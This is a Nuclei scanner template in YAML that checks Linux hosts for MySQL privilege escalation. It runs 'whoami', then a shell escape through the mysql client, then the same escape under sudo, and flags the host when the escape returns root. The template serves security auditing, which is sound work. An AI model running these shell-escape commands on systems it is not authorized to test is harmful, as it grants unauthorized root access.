code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'mysql -e ''\! whoami''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo mysql -e ''\! whoami''

    '
id: privesc-mysql
info:
  author: daffainfo
  description: 'MySQL is an open-source relational database management system (RDBMS)
    that uses structured query language (SQL) for managing and manipulating data.
    It is widely used for web applications and is known for its reliability, ease
    of use, and performance. MySQL is a popular choice for database-driven applications
    and is supported on various platforms.

    '
  metadata:
    max-request: 3
    verified: true
  name: MySQL - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/mysql/
  severity: high
  tags: code,linux,mysql,privesc,local
self-contained: true
